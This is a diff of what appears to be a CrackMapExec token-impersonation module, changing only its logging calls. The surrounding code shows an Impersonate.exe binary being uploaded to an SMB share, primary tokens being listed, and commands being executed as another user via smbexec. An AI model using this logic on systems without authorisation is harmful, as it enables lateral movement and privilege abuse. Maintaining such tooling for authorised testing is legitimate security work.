@@ -56,18 +56,18 @@ class CMEModule:
                 context.log.error(f"Cannot open {self.imp_exe}")
                 exit(1)
 
-        context.log.info(f"Uploading {self.impersonate}")
+        context.log.display(f"Uploading {self.impersonate}")
         with open(file_to_upload, 'rb') as impersonate:
             try:
                 connection.conn.putFile(self.share, f"{self.tmp_share}{self.impersonate}", impersonate.read)
                 context.log.success(f"Impersonate binary successfully uploaded")
             except Exception as e:
-                context.log.error(f"Error writing file to share {self.tmp_share}: {e}")
+                context.log.fail(f"Error writing file to share {self.tmp_share}: {e}")
                 return
 
         try:
             if self.cmd == "" or self.token == "":
-                context.log.info(f"Listing available primary tokens")
+                context.log.display(f"Listing available primary tokens")
                 p = self.list_available_primary_tokens(context, connection)
                 for line in p.splitlines():
                     token, token_integrity, token_owner = line.split(" ", 2)
@@ -82,18 +82,18 @@ class CMEModule:
                         break
 
                 if impersonated_user:  
-                    context.log.info(f"Executing {self.cmd} as {impersonated_user}")
+                    context.log.display(f"Executing {self.cmd} as {impersonated_user}")
                     command = f'{self.tmp_dir}Impersonate.exe exec {self.token} \"{self.cmd}\"'
                     for line in connection.execute(command, True, methods=["smbexec"]).splitlines():
                         context.log.highlight(line)
                 else:
-                    context.log.error(f"Invalid token ID submitted")
+                    context.log.fail(f"Invalid token ID submitted")
 
         except Exception as e:
-            context.log.error(f"Error runing command: {e}")
+            context.log.fail(f"Error runing command: {e}")
         finally:
             try:
                 connection.conn.deleteFile(self.share, f"{self.tmp_share}{self.impersonate}")
                 context.log.success(f"Impersonate binary successfully deleted")
             except Exception as e:
-                context.log.error(f"Error deleting Impersonate.exe on {self.share}: {e}")
+                context.log.fail(f"Error deleting Impersonate.exe on {self.share}: {e}")
